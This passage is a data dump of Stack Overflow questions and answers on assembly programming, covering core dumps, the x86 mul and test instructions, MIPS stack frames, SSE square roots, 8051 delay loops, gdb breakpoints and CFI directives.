    0xf2221000-&gt;0xf2221000 at 0x19e24000: load157 ALLOC READONLY
    0xf234d000-&gt;0xf23fd000 at 0x19e24000: load158 ALLOC LOAD HAS_CONTENTS
    0xf23fd000-&gt;0xf23fe000 at 0x19ed4000: load159 ALLOC LOAD READONLY HAS_CONTENTS
    0xf23fe000-&gt;0xf2dfe000 at 0x19ed5000: load160 ALLOC LOAD HAS_CONTENTS
    0xf2dfe000-&gt;0xf2dff000 at 0x1a8d5000: load161 ALLOC LOAD READONLY HAS_CONTENTS
    0xf2dff000-&gt;0xf37ff000 at 0x1a8d6000: load162 ALLOC LOAD HAS_CONTENTS
    0xf37ff000-&gt;0xf3800000 at 0x1b2d6000: load163 ALLOC LOAD READONLY HAS_CONTENTS
    0xf3800000-&gt;0xf4200000 at 0x1b2d7000: load164 ALLOC LOAD HAS_CONTENTS
    0xf4200000-&gt;0xf4221000 at 0x1bcd7000: load165 ALLOC LOAD HAS_CONTENTS
    0xf4221000-&gt;0xf4221000 at 0x1bcf8000: load166 ALLOC READONLY
    0xf4349000-&gt;0xf43fd000 at 0x1bcf8000: load167 ALLOC LOAD HAS_CONTENTS
    0xf43fd000-&gt;0xf43fe000 at 0x1bdac000: load168 ALLOC LOAD READONLY HAS_CONTENTS
    0xf43fe000-&gt;0xf4dfe000 at 0x1bdad000: load169 ALLOC LOAD HAS_CONTENTS
    0xf4dfe000-&gt;0xf4dff000 at 0x1c7ad000: load170 ALLOC LOAD READONLY HAS_CONTENTS
    0xf4dff000-&gt;0xf57ff000 at 0x1c7ae000: load171 ALLOC LOAD HAS_CONTENTS
    0xf57ff000-&gt;0xf5800000 at 0x1d1ae000: load172 ALLOC LOAD READONLY HAS_CONTENTS
    0xf5800000-&gt;0xf6200000 at 0x1d1af000: load173 ALLOC LOAD HAS_CONTENTS
    0xf6200000-&gt;0xf6300000 at 0x1dbaf000: load174 ALLOC LOAD HAS_CONTENTS
    0xf6339000-&gt;0xf6366000 at 0x1dcaf000: load175 ALLOC LOAD HAS_CONTENTS
    0xf6366000-&gt;0xf6367000 at 0x1dcdc000: load176 ALLOC LOAD READONLY HAS_CONTENTS
    0xf6367000-&gt;0xf6d67000 at 0x1dcdd000: load177 ALLOC LOAD HAS_CONTENTS
    0xf6d67000-&gt;0xf6d68000 at 0x1e6dd000: load178 ALLOC LOAD READONLY HAS_CONTENTS
    0xf6d68000-&gt;0xf77ae000 at 0x1e6de000: load179 ALLOC LOAD HAS_CONTENTS
    0xf77b7000-&gt;0xf77bb000 at 0x1f124000: load180 ALLOC LOAD HAS_CONTENTS
    0xfff0b000-&gt;0xfff21000 at 0x1f128000: load181 ALLOC LOAD HAS_CONTENTS
</code></pre>
","<p>that looks like an in-kernel memory reference to me (above 0xc0000000, assuming Linux and 32-bit process). To find out, check out /proc/{yourpid}/maps</p>

<blockquote>
  <p>Shouldn't the core dump contain a snapshot of all the allocated memory?</p>
</blockquote>

<p>It should, but if something has corrupted your process' memory, you've got a snapshot of corrupted program state, and thus some garbage may be found where valid pointers are expected.</p>

<blockquote>
  <p>What are the possible causes for this? Am I missing some info from the core dump?</p>
</blockquote>

<p>I note that when running a 32-bit executable on a 64-bit system, the full 4GB address space can be used by the process. e.g.</p>

<pre><code>ia32kernel# pmap `pidof cat` 
004e8000    108K r-x--  /lib/ld-2.11.1.so
00503000      4K r----  /lib/ld-2.11.1.so
00504000      4K rw---  /lib/ld-2.11.1.so
006d3000   1380K r-x--  /lib/tls/i686/cmov/libc-2.11.1.so
0082c000      8K r----  /lib/tls/i686/cmov/libc-2.11.1.so
0082e000      4K rw---  /lib/tls/i686/cmov/libc-2.11.1.so
0082f000     12K rw---    [ anon ]
00f64000      4K r-x--    [ anon ]
08048000     48K r-x--  /bin/cat
08054000      4K r----  /bin/cat
08055000      4K rw---  /bin/cat
</code></pre>

<p>vs.</p>

<pre><code>amd64kernel# pmap `pidof cat` 
0000000008048000     48K r-x--  /home/martin/cat
0000000008054000      4K r----  /home/martin/cat
0000000008055000      4K rw---  /home/martin/cat
0000000009e1d000    132K rw---    [ anon ]
00000000f766c000      4K rw---    [ anon ]
00000000f766d000   1280K r-x--  /lib32/libc-2.11.3.so
00000000f77ad000      4K -----  /lib32/libc-2.11.3.so
00000000f77ae000      8K r----  /lib32/libc-2.11.3.so
00000000f77b0000      4K rw---  /lib32/libc-2.11.3.so
00000000f77b1000     12K rw---    [ anon ]
00000000f77c0000      8K rw---    [ anon ]
00000000f77c2000      4K r-x--    [ anon ]
00000000f77c3000    112K r-x--  /lib32/ld-2.11.3.so
00000000f77df000      4K r----  /lib32/ld-2.11.3.so
00000000f77e0000      4K rw---  /lib32/ld-2.11.3.so
</code></pre>

<p>So if you're trying to inspect on a 32-bit machine a coredump that was captured on a 64-bit machine, those high-addresses libraries such as libc.so can't be mapped as expected even though the same 32-bit binary is used on both systems.</p>
","14896909"
"How does asm(""nop""); works?","31371","","<p>I red the definition from <a href=""http://en.wikipedia.org/wiki/NOP"">http://en.wikipedia.org/wiki/NOP</a> but I still need a simpler definition. </p>

<p>I stumbled across a code and I don't know exactly what it does:</p>

<pre><code>switch (Something)
    {

        case this_one:
            asm (""nop"");
            break;
        case other_one:
            asm (""nop"");
            break;
        default:
            asm (""nop"");
            break;
    }
</code></pre>
","<p><code>nop</code> is an assembly instruction that does nothing--well as close to nothing as you can do and still execute a machine instruction, which means (probably) a REALLY tiny bit of time goes by (which can have limited value in certain realtime applications.</p>

<p>In this case, the statement <code>asm(""nop"");</code> makes no semantic difference to the program. The only reason I can think that it might be present is to ""force"" the compiler to NOT collapse the code paths, making the machine structure of the switch statement visible if you look at the object code or disassemble the machine code or view it in a debugger.</p>
","24359671"
"MIPS: relevant use for a stack pointer ($sp) and the stack","31236","","<p>Currently I'm studying for my computer organization midterm, and I'm trying to fully understand the stack pointer and the stack. I know these following facts that surround the concept:</p>

<ul>
<li>It follows the first in last out principle</li>
<li><p>And adding something to the stack takes a two step process:</p>

<pre><code>addi $sp, $sp, -4
sw $s0, 0($sp)
</code></pre></li>
</ul>

<p>What I think is stopping me from fully understanding is that I can't come up with a relevant, self apparent situation where I would need and/or want to keep track of data with a stack pointer.</p>

<p>Could someone elaborate on the concept as a whole and give me some useful code examples?</p>
","<p>An important use of stack is nesting subroutine calls.</p>

<p>Each subroutine may have a set of variables local to that subroutine. These variables can be conveniently stored on a stack in a <em>stack frame</em>. Some calling conventions pass arguments on the stack as well.</p>

<p>Using subroutines also means you have to keep track of the caller, that is the return address.
Some architectures have a dedicated stack for this purpose, while others implicitly use the ""normal"" stack. MIPS by default only uses a register, but in non-leaf functions (ie. functions that call other functions) that return address is overwritten. Hence you have to save the original value, typically on the stack among your local variables. The calling conventions may also declare that some register values must be preserved across function calls, you can similarly save and restore them using the stack.</p>

<p>Suppose you have this C fragment:</p>

<pre class=""lang-c prettyprint-override""><code>extern void foo();
extern int bar();
int baz()
{
    int x = bar();
    foo();
    return x;
}
</code></pre>

<p>MIPS assembly may then look like:</p>

<pre class=""lang-none prettyprint-override""><code>addiu $sp, $sp, -8  # allocate 2 words on the stack
sw $ra, 4($sp)      # save $ra in the upper one
jal bar             # this overwrites $ra
sw $v0, ($sp)       # save returned value (x)
jal foo             # this overwrites $ra and possibly $v0
lw $v0, ($sp)       # reload x so we can return it
lw $ra, 4($sp)      # reload $ra so we can return to caller
addiu $sp, $sp, 8   # restore $sp, freeing the allocated space
jr $ra              # return
</code></pre>
","15101292"
"complex IF statement in assembly","30959","","<p>How should I write such an <code>if</code> statement in assembly?</p>

<pre><code>if ((a == b AND a &gt; c) OR c == b) { ...
</code></pre>

<p>Platform: Intel 32-bit machine, NASM syntax.</p>

<p><strong>Update</strong></p>

<p>For variable types and value, use whatever is more easy to understand. Integers would works fine for me, I guess.</p>
","<p>In generic assembly, it will be basically something like this (<code>a</code> in <code>ax</code>, <code>b</code> in <code>bx</code>, <code>c</code> in <code>cx</code>):</p>

<pre><code>    cmp  bx, cx
    jeq  istrue
    cmp  ax, cx
    jle  isfalse
    cmp  ax, bx
    jeq  istrue
isfalse:
    ; do false bit
    jmp  nextinstr
istrue:
    ; do true bit

nextinstr:
    ; carry on
</code></pre>

<p>If there's no false bit, it can be simplified to:</p>

<pre><code>    cmp  bx, cx
    jeq  istrue
    cmp  ax, bx
    jne  nextinstr
    cmp  ax, cx
    jle  nextinstr
istrue:
    ; do true bit

nextinstr:
    ; carry on
</code></pre>
","14292981"
"Why is SSE scalar sqrt(x) slower than rsqrt(x) * x?","30907","","<p>I've been profiling some of our core math on an Intel Core Duo, and while looking at various approaches to square root I've noticed something odd: using the SSE scalar operations, it is faster to take a reciprocal square root and multiply it to get the sqrt, than it is to use the native sqrt opcode!</p>

<p>I'm testing it with a loop something like:</p>



<pre class=""lang-c prettyprint-override""><code>inline float TestSqrtFunction( float in );

void TestFunc()
{
  #define ARRAYSIZE 4096
  #define NUMITERS 16386
  float flIn[ ARRAYSIZE ]; // filled with random numbers ( 0 .. 2^22 )
  float flOut [ ARRAYSIZE ]; // filled with 0 to force fetch into L1 cache

  cyclecounter.Start();
  for ( int i = 0 ; i &lt; NUMITERS ; ++i )
    for ( int j = 0 ; j &lt; ARRAYSIZE ; ++j )
    {
       flOut[j] = TestSqrtFunction( flIn[j] );
       // unrolling this loop makes no difference -- I tested it.
    }
  cyclecounter.Stop();
  printf( ""%d loops over %d floats took %.3f milliseconds"",
          NUMITERS, ARRAYSIZE, cyclecounter.Milliseconds() );
}
</code></pre>

<p>I've tried this with a few different bodies for the TestSqrtFunction, and I've got some timings that are really scratching my head. The worst of all by far was using the native sqrt() function and letting the ""smart"" compiler ""optimize"". At 24ns/float, using the x87 FPU this was pathetically bad:</p>

<pre class=""lang-c prettyprint-override""><code>inline float TestSqrtFunction( float in )
{  return sqrt(in); }
</code></pre>

<p>The next thing I tried was using an intrinsic to force the compiler to use SSE's scalar sqrt opcode:</p>

<pre class=""lang-c prettyprint-override""><code>inline void SSESqrt( float * restrict pOut, float * restrict pIn )
{
   _mm_store_ss( pOut, _mm_sqrt_ss( _mm_load_ss( pIn ) ) );
   // compiles to movss, sqrtss, movss
}
</code></pre>

<p>This was better, at 11.9ns/float. I also tried <a href=""http://www.beyond3d.com/content/articles/8/"" rel=""noreferrer"">Carmack's wacky Newton-Rhapson approximation technique</a>, which ran even better than the hardware, at 4.3ns/float, although with an error of 1 in 2<sup>10</sup> (which is too much for my purposes). </p>

<p>The doozy was when I tried the SSE op for <em>reciprocal</em> square root, and then used a multiply to get the square root ( x * 1/&radic;x = &radic;x ). Even though this takes two dependent operations, it was the fastest solution by far, at 1.24ns/float and accurate to 2<sup>-14</sup>:</p>

<pre class=""lang-c prettyprint-override""><code>inline void SSESqrt_Recip_Times_X( float * restrict pOut, float * restrict pIn )
{
   __m128 in = _mm_load_ss( pIn );
   _mm_store_ss( pOut, _mm_mul_ss( in, _mm_rsqrt_ss( in ) ) );
   // compiles to movss, movaps, rsqrtss, mulss, movss
}
</code></pre>

<p>My question is basically <em>what gives</em>? <strong>Why is SSE's built-in-to-hardware square root opcode <em>slower</em> than synthesizing it out of two other math operations?</strong></p>

<p>I'm sure that this is really the cost of the op itself, because I've verified:</p>

<ul>
<li>All data fits in cache, and
accesses are sequential </li>
<li>the functions are inlined</li>
<li>unrolling the loop makes no difference</li>
<li>compiler flags are set to full optimization (and the assembly is good, I checked)</li>
</ul>

<p>(<strong>edit</strong>: stephentyrone correctly points out that operations on long strings of numbers should use the vectorizing SIMD packed ops, like <code>rsqrtps</code> &mdash; but the array data structure here is for testing purposes only: what I am really trying to measure is <em>scalar</em> performance for use in code that can't be vectorized.)</p>
","<p><code>sqrtss</code> gives a correctly rounded result.  <code>rsqrtss</code> gives an <em>approximation</em> to the reciprocal, accurate to about 11 bits.</p>

<p><code>sqrtss</code> is generating a far more accurate result, for when accuracy is required.  <code>rsqrtss</code> exists for the cases when an approximation suffices, but speed is required.  If you read Intel's documentation, you will also find an instruction sequence (reciprocal square-root approximation followed by a single Newton-Raphson step) that gives nearly full precision (~23 bits of accuracy, if I remember properly), and is still somewhat faster than <code>sqrtss</code>.</p>

<p><strong>edit:</strong> If speed is critical, and you're really calling this in a loop for many values, you should be using the vectorized versions of these instructions, <code>rsqrtps</code> or <code>sqrtps</code>, both of which process four floats per instruction.</p>
","1528751"
"How to draw square in assembly language","30598","","<p>T want to draw square in assembly language. I have ridden something about <code>int 10h</code>. Does anybody know, how to do it? Please place here me some piece of code what can I use for drawing a squares, or some quality tutorials. Thanks.</p>
","<p>Like Frederic Hamidi said, ""int 0x10h"" is an obsolete BIOS interface.  If you're interested in assembly, I would strongly encourage to AVOID 16-bit, DOS/Masm tutorials and learn on a more modern OS (like Linux).  </p>

<p>I'd highly recommend ""Programming from the Ground Up"", by Jonathan Bartlett:</p>

<p><a href=""http://savannah.nongnu.org/projects/pgubook/"">http://savannah.nongnu.org/projects/pgubook/</a></p>

<p>Nevertheless, if you REALLY want to draw a line (or a square) in 16-bit real mode (i.e. in DOS), here's an example:</p>

<p><a href=""http://lateblt.tripod.com/asm.htm"">http://lateblt.tripod.com/asm.htm</a></p>

<pre><code>; Draw a line in a graphics mode

;By extension, draws a yellow line in the upper-left.
;A good example of how to efficiently use INC, CMP,
;and a conditional jump for repetitive tasks.

mov ah,00h
mov al,13h
int 10h

;The above three lines just switch to 320x200 256-color VGA.

mov ds,40960
;a000h = 40960 decimal
mov ax, 44h
;44h is yellow! ;)
mov bx,0000
START:
mov [bx],ax
inc bx
cmp bx,20
JL START

;This waits until BX reaches 20, then exits!

mov ah,004C  ;terminate program
int 21h
</code></pre>
","6808764"
"What does the MOVZBL instruction do in IA-32 AT&T syntax?","30417","","<p>What exactly the instruction</p>

<pre><code>movzbl  0x01(%eax,%ecx),%eax
</code></pre>

<p>does?</p>
","<p>AT&amp;T syntax splits the <a href=""http://www.felixcloutier.com/x86/MOVZX.html"" rel=""noreferrer""><code>movzx</code> Intel instruction mnemonic</a> into different mnemonics for different source sizes (<code>movzb</code> vs. <code>movzw</code>).  In Intel syntax, it's:</p>

<pre><code>movzx eax, byte ptr [eax+ecx+1]
</code></pre>

<p>i.e. load a byte from memory at eax+ecx+1 and zero-extend to full register.</p>

<p>BTW, most GNU tools now have a switch or a config option to prefer Intel syntax.  (Such as <code>objdump -Mintel</code> or <code>gcc -S -masm=intel</code>, although the latter affects the syntax used when compiling inline-asm).  I would certainly recommend to look into it, if you don't do AT&amp;T assembly for living.  See also the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki for more docs and guides.</p>
","9318005"
"How to break on assembly instruction at a given address in gdb?","30402","","<pre><code>0x0000000000400448 &lt;main+0&gt;:    push   %rbp
0x0000000000400449 &lt;main+1&gt;:    mov    %rsp,%rbp
0x000000000040044c &lt;main+4&gt;:    mov    $0x6,%eax
0x0000000000400451 &lt;main+9&gt;:    leaveq 
0x0000000000400452 &lt;main+10&gt;:   retq   
</code></pre>

<p>I tried:</p>

<pre><code>breaki 0x0000000000400448
</code></pre>

<p>but it seems that there not such command.</p>

<p>Does gdb have such a feature?</p>
","<p>try <code>break *0x0000000000400448</code></p>
","5459664"
"Very fast memcpy for image processing?","30376","","<p>I am doing image processing in C that requires copying large chunks of data around memory - the source and destination never overlap.</p>

<p>What is the absolute fastest way to do this on the x86 platform using <a href=""http://en.wikipedia.org/wiki/GNU_Compiler_Collection"" rel=""noreferrer"">GCC</a> (where <a href=""http://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"" rel=""noreferrer"">SSE</a>, SSE2 but NOT SSE3 are available)?</p>

<p>I expect the solution will either be in assembly or using GCC intrinsics? </p>

<p>I found the following link but have no idea whether it's the best way to go about it (the author also says it has a few bugs): <a href=""http://coding.derkeiler.com/Archive/Assembler/comp.lang.asm.x86/2006-02/msg00123.html"" rel=""noreferrer"">http://coding.derkeiler.com/Archive/Assembler/comp.lang.asm.x86/2006-02/msg00123.html</a></p>

<p>EDIT: note that a copy is necessary, I cannot get around having to copy the data (I could explain why but I'll spare you the explanation :))</p>
","<p>Courtesy of <a href=""http://williamchan.ca/portfolio/assembly/ssememcpy/"" rel=""noreferrer"">William Chan</a> and Google. 30-70% faster than memcpy in Microsoft Visual Studio 2005.</p>

<pre><code>void X_aligned_memcpy_sse2(void* dest, const void* src, const unsigned long size)
{

  __asm
  {
    mov esi, src;    //src pointer
    mov edi, dest;   //dest pointer

    mov ebx, size;   //ebx is our counter 
    shr ebx, 7;      //divide by 128 (8 * 128bit registers)


    loop_copy:
      prefetchnta 128[ESI]; //SSE2 prefetch
      prefetchnta 160[ESI];
      prefetchnta 192[ESI];
      prefetchnta 224[ESI];

      movdqa xmm0, 0[ESI]; //move data from src to registers
      movdqa xmm1, 16[ESI];
      movdqa xmm2, 32[ESI];
      movdqa xmm3, 48[ESI];
      movdqa xmm4, 64[ESI];
      movdqa xmm5, 80[ESI];
      movdqa xmm6, 96[ESI];
      movdqa xmm7, 112[ESI];

      movntdq 0[EDI], xmm0; //move data from registers to dest
      movntdq 16[EDI], xmm1;
      movntdq 32[EDI], xmm2;
      movntdq 48[EDI], xmm3;
      movntdq 64[EDI], xmm4;
      movntdq 80[EDI], xmm5;
      movntdq 96[EDI], xmm6;
      movntdq 112[EDI], xmm7;

      add esi, 128;
      add edi, 128;
      dec ebx;

      jnz loop_copy; //loop please
    loop_copy_end:
  }
}
</code></pre>

<p>You may be able to optimize it further depending on your exact situation and any assumptions you are able to make. </p>

<p>You may also want to check out the memcpy source (memcpy.asm) and strip out its special case handling. It may be possible to optimise further! </p>
","1715385"
"How to enable Assembly Language support in Visual Studio 2013","30277","","<p>I have been searching around and everyone provides just a simple answer</p>

<blockquote>
  <p>Right-click the project, Custom Build Rules, tick ""Microsoft Macro Assembler"".</p>
</blockquote>

<p>But sadly, In 2013 its not the same. Here is the screenshot <img src=""https://i.stack.imgur.com/Ocm5b.png"" alt=""enter image description here""></p>

<p>I don't know how to enable Assembly Language; by enabling Microsoft Macro Assembler. Any guidance?</p>

<p>I have tried all of these settings and there is no such thing as the MASM in any option tab. </p>
","<p>Right-click the project, not the solution.  Then Build Dependencies + Build Customizations.  You get the dialog, tick ""masm"".</p>
","20078254"
"What does ""multicore"" assembly language look like?","30223","","<p>Once upon a time, to write x86 assembler, for example, you would have instructions stating ""load the EDX register with the value 5"", ""increment the EDX"" register, etc.</p>

<p>With modern CPUs that have 4 cores (or even more), at the machine code level does it just look like there are 4 separate CPUs (i.e. are there just 4 distinct ""EDX"" registers) ?  If so, when you say ""increment the EDX register"", what determines which CPU's EDX register is incremented? Is there a ""CPU context"" or ""thread"" concept in x86 assembler now?</p>

<p>How does communication/synchronization between the cores work?</p>

<p>If you were writing an operating system, what mechanism is exposed via hardware to allow you to schedule execution on different cores? Is it some special priviledged instruction(s)?</p>

<p>If you were writing an optimizing compiler/bytecode VM for a multicore CPU, what would you need to know specifically about, say, x86 to make it generate code that runs efficiently across all the cores?</p>

<p>What changes have been made to x86 machine code to support multi-core functionality?</p>
","<p>This isn't a direct answer to the question, but it's an answer to a question that appears in the comments.  Essentially, the question is what support the hardware gives to multi-threaded operation.</p>

<p><a href=""https://stackoverflow.com/users/19521/nicholas-flynt"">Nicholas Flynt had it right</a>, at least regarding x86.  In a multi threaded environment (Hyper-threading, multi-core or multi-processor), the <em>Bootstrap thread</em> (usually thread 0 in core 0 in processor 0) starts up fetching code from address <code>0xfffffff0</code>.  All the other threads start up in a special sleep state called <em>Wait-for-SIPI</em>.  As part of its initialization, the primary thread sends a special inter-processor-interrupt (IPI) over the APIC called a SIPI (Startup IPI) to each thread that is in WFS.  The SIPI contains the address from which that thread should start fetching code.</p>

<p>This mechanism allows each thread to execute code from a different address.  All that's needed is software support for each thread to set up its own tables and messaging queues.  The OS uses <em>those</em> to do the actual multi-threaded scheduling.</p>

<p>As far as the actual assembly is concerned, as Nicholas wrote, there's no difference between the assemblies for a single threaded or multi threaded application. Each logical thread has its own register set, so writing:</p>

<pre><code>mov edx, 0
</code></pre>

<p>will only update <code>EDX</code> for the <em>currently running thread</em>.  There's no way to modify <code>EDX</code> on another processor using a single assembly instruction.  You need some sort of system call to ask the OS to tell another thread to run code that will update its own <code>EDX</code>.</p>
","991191"
"What do andi and ori do in this program?","30046","","<pre><code>        .global main            # makes label ""main"" globally known

        .text                   # Instructions follow
        .align  2               # Align instructions to 4-byte words

main:   movi    r16,0x47        # Load the hexadecimal value 41
                                # to register r16

loop:   mov     r4,r16          # Copy to r4 from r16

        nop                     # (later changed to call hexasc)
        nop                     # (later changed to mov r4,r2)

        movia   r8,putchar      # copy subroutine address to a register
        callr   r8              # call subroutine via register

        addi    r16, r16,1      # Add 1 to register r16
        andi    r16, r16, 0x7f  # mask with 7 bits
        ori     r16, r16, 0x20  # set a bit to avoid control chars

        br      loop            # Branch to loop

        .end                    # The assembler will stop reading here
        foo bar bletch          # comes after .end - ignored
</code></pre>

<p>I can understand everything, I think, except how the two instructions <code>andi</code> and <code>ori</code> work in this case. ori appears to make so that the ASCII 20 positions forward is printed but why  and how?</p>
","<p>andi and ori are both bitwise operators:</p>

<p>To see the difference, concider""</p>

<pre><code>and $rd, $rs, $rt
or  $rd, $rs, $rt 
</code></pre>

<p>versus</p>

<pre><code>andi $rt, $rs, immed
ori  $rt, $rs, immed
</code></pre>

<p><a href=""http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/bitwise.html"" rel=""nofollow"">http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/bitwise.html</a></p>
","12032486"
"Is it possible to multiply by an immediate with mul in x86 Assembly?","30033","","<p>I am learning assembly for x86 using DosBox emulator. I am trying to perform multiplication. I do not get how it works. When I write the following code:</p>

<pre><code>mov al, 3
mul 2
</code></pre>

<p>I get an error. Although, in the reference I am using, it says in multiplication, it assumes AX is always the place holder, therefore, if I write:</p>

<pre><code>mul, 2
</code></pre>

<p>It multiplies <code>al</code> value by 2. But it does not work with me.</p>

<p>When I try the following:</p>

<pre><code>mov al, 3
mul al,2
int 3
</code></pre>

<p>I get result 9 in ax. See this picture for clarification:
<img src=""https://i.stack.imgur.com/4oIZQ.png"" alt=""enter image description here""></p>

<p>Another question: Can I multiply using memory location directly? Example:</p>

<pre><code>mov si,100
mul [si],5
</code></pre>
","<p>There's no form of <code>MUL</code> that accepts an immediate operand.</p>

<p>Either do:</p>

<pre><code>mov al,3
mov bl,2
mul bl     ; the product is in ax
</code></pre>

<p>or:</p>

<pre><code>mov ax,3
imul ax,2  ; imul is for signed multiplication, but that doesn't matter here
           ; the product is in ax
</code></pre>

<p>or:</p>

<pre><code>mov al,3
add al,al  ; same thing as multiplying by 2
</code></pre>

<p>or:</p>

<pre><code>mov al,3
shl al,1   ; same thing as multiplying by 2
</code></pre>
","20499363"
"What does the `test` instruction do?","29893","","<p>I'm looking at some small assembler codes and I'm having trouble understanding the TEST instruction and its use. I'm looking at the following code at the end of a loop:</p>

<pre><code>8048531:    84 c0                   test   al,al
8048533:    75 dc                   jne    8048511 &lt;function+0x2d&gt;
</code></pre>

<p>The way i understand TEST is that it works a bit like the AND operator and it sets some flags. I guess I don't really understand how the flags work. <code>test al,al</code> to me looks like it checks the same lower bits and will always get the same results. </p>

<p>Can someone explain?</p>
","<p>It tests the register against itself, just to set the flags. The result will be different for a zero and a non-zero value.</p>
","6002104"
"Writing a delay subroutine?","29872","","<p>I need to write a delay subroutine. It should delay about 1 second. It has to be for 8051 environment, DS89C430 micrcontroller ( 11.0592 MHz XTAL). How can I write this subroutine?</p>

<pre><code>Delay1sec: ...
....
...
....
...
</code></pre>
","<p>To get an exact 1 second delay that also works during interrupts, you need to use a hardware timer, not a software timer.  I would advise you to use one of the available on-board timers <a href=""https://stackoverflow.com/questions/5134836/writing-a-delay-subroutine/5135010#5135010"">as suggested by Jerry Coffin</a>.    </p>

<p>Here's an approach involving a built-in timer and counting timer overflows.  Since the running timer is updated every 12 clock cycles by default to maintain compatibility with the 8051, it will be updated 921,600 times per second.  A bit of multiplication tells us that it takes 50 ms to count from 0 to 46080, which also tells us that we can start a 16-bit timer at 19456 and wait for it to overflow 20 times to delay for 1 second<sup>*</sup>.</p>

<p>The code could look something like this:</p>

<pre><code>        CLR     T0M          ; set timer 0 to use a divide-by-12 of
                             ; the crystal frequency (default)

        MOV     R0,TMOD      ; set timer 0 to 16-bit mode without
        ORL     R0,#01h      ; affecting the setup of timer 1
        MOV     TMOD,R0

        LCALL   Delay1sec    ; call the delay subroutine

Delay1sec:
        MOV     R0,#20d      ; set loop count to 20

loop:   CLR     TR0          ; start each loop with the timer stopped
        CLR     TF0          ; and the overflow flag clear. setup
        MOV     TH0,#4Ch     ; timer 0 to overflow in 50 ms, start the
        MOV     TL0,#00h     ; timer, wait for overflow, then repeat
        SETB    TR0          ; until the loop count is exhausted
        JNB     TF0,$
        DJNZ    R0,loop
        RET   
</code></pre>

<p><sub><b>Note: Overhead of instruction execution time excluded from example.</b></sub>
<br>
<sub>* How the math breaks down:<br>
11059200 / 12 =  921600 <br>
0.05 * 921600 = 46080 <br>
65536 - 46080 = 19456 = 0x4C00 </sub></p>

<hr>

<p>Software delay loops waste processor time and are disturbed by interrupts.  That being said, you can do it the hardcoded way.  </p>

<p>One approach involves knowing the number of clock cycles per machine cycle and the number of machine cycles various instructions take to execute.  According to the <a href=""http://datasheets.maxim-ic.com/en/ds/DS89C430-DS89C450.pdf"" rel=""nofollow noreferrer"">data sheet</a>, the DS89C430 usually uses one machine cycle for each instruction byte and requires one cycle for execution.  The number of cycles for each instruction is provided in the <a href=""http://www.maxim-ic.com/products/microcontrollers/pdfs/DS89C430_User_Guide.pdf"" rel=""nofollow noreferrer""><em>Ultra-High-Speed Flash Microcontroller User's Guide</em></a>.</p>

<p>Since your crystal frequency is 11.0592 MHz, your routine will need to delay for 11,059,200 clock cycles.  This is often accomplished via nested loops of known length and then including any extra loop setup and possibly subroutine call and return instructions<sup>*</sup>.</p>

<p>The function could look something like this:</p>

<pre><code>Delay1sec:                   ; &lt;------------------------------+
;       LCALL   Delay1sec    ; 3 cycles                       |
        MOV     R2,#42d      ; 2 cycles                       |
        MOV     R1,#00d      ; 2 cycles                       |
        MOV     R0,#00d      ; 2 cycles                       |
loop:   DJNZ    R0,loop      ; 4 cycles &lt;-- l1 &lt;- l2 &lt;- l3    Delay1sec
        DJNZ    R1,loop      ; 4 cycles &lt;---------+     |     |
        DJNZ    R2,loop      ; 4 cycles &lt;---------------+     |
        RET                  ; 3 cycles &lt;---------------------+
</code></pre>

<p>Let's see how the math breaks down<sup>**</sup>:</p>

<p><code>l1</code> = 4 * 256 = 1024 cycles <br>
<code>l2</code> = (1024 + 4) * 256 = 263168 cycles <br>
<code>l3</code> = (263168 + 4) * 42 = 11053224 cycles <br>
<code>Delay1sec</code> = 11072668 + 3 + 2 + 2 + 2 + 3 = 11053236 cycles <br></p>

<p>11053236 cycles * 1/11059200 seconds/cycle = <strong>999.461 ms</strong> <br></p>

<p><sub>* The subroutine call and return instructions may be omitted as necessary.</sub> <br>
<sub>** I used Microsoft Excel to assist with calculations related to determining loop counters.</sub></p>
","5162065"
"What are CFI directives in Gnu Assembler (GAS) used for?","29396","","<p>There seem to be a .CFI directive after every line and also there are wide varities of these ex.,<code>.cfi_startproc</code> , <code>.cfi_endproc</code> etc..  <a href=""http://sourceware.org/binutils/docs-2.17/as/CFI-directives.html#CFI-directives"" rel=""noreferrer"">more here</a>. </p>

<pre><code>    .file   ""temp.c""
    .text
.globl main
    .type   main, @function
main:
.LFB0:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    movq    %rsp, %rbp
    .cfi_offset 6, -16
    .cfi_def_cfa_register 6
    movl    $0, %eax
    leave
    ret
    .cfi_endproc
.LFE0:
    .size   main, .-main
.globl func
    .type   func, @function
func:
.LFB1:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    movq    %rsp, %rbp
    .cfi_offset 6, -16
    .cfi_def_cfa_register 6
    movl    %edi, -4(%rbp)
    movl    %esi, %eax
    movb    %al, -8(%rbp)
    leave
    ret
    .cfi_endproc
.LFE1:
    .size   func, .-func
    .ident  ""GCC: (Ubuntu 4.4.1-4ubuntu9) 4.4.1""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>I didn't get the purpose of these.</p>
","<p>I've got a feeling it stands for <a href=""http://en.wikipedia.org/wiki/Call_frame#Structure"" rel=""noreferrer"">Call Frame Information</a> and is a GNU AS extension to manage call frames. From <a href=""http://www.ibm.com/developerworks/systems/library/es-gnutool/"" rel=""noreferrer"">DeveloperWorks</a>:</p>

<blockquote>
  <p>On some architectures, exception
  handling must be managed with Call
  Frame Information directives. These
  directives are used in the assembly to
  direct exception handling. These
  directives are available on Linux on
  POWER, if, for any reason (portability
  of the code base, for example), the
  GCC generated exception handling
  information is not sufficient.</p>
</blockquote>

<p>It looks like these are generated on some platforms depending on need for exception handling.</p>

<p>If you are looking to disable these, please see <a href=""https://stackoverflow.com/a/16007194/257111"">David's answer</a>.</p>
","2529237"
"How does one do integer (signed or unsigned) division on ARM?","29314","","<p>I'm working on Cortex-A8 and Cortex-A9 in particular. I know that some architectures don't come with integer division, but what is the best way to do it other than convert to float, divide, convert to integer? Or is that indeed the best solution?</p>

<p>Cheers! = )</p>
","<p>The compiler normally includes a divide in its library, gcclib for example I have extracted them from gcc and use them directly:</p>

<p><a href=""https://github.com/dwelch67/stm32vld/"" rel=""nofollow"">https://github.com/dwelch67/stm32vld/</a> then stm32f4d/adventure/gcclib</p>

<p>going to float and back is probably not the best solution.  you can try it and see how fast it is...This is a multiply but could as easily make it a divide:</p>

